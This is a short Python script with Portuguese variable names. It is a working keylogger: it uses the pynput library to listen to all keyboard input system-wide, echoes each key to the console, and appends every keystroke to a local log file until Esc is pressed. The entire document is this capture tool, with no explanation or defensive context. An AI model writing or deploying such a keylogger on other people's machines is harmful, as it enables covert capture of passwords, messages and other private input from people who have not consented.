from pynput import keyboard

arquivo_log = "captura_teclado.txt"

def on_press(key):
    try:
        tecla = key.char
    except AttributeError:
        tecla = f'[{key.name}]'

    print(f"Tecla pressionada: {tecla}")

    with open(arquivo_log, "a", encoding="utf-8") as f:
        f.write(tecla)

def on_release(key):
    if key == keyboard.Key.esc:
        print("Encerrando captura...")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()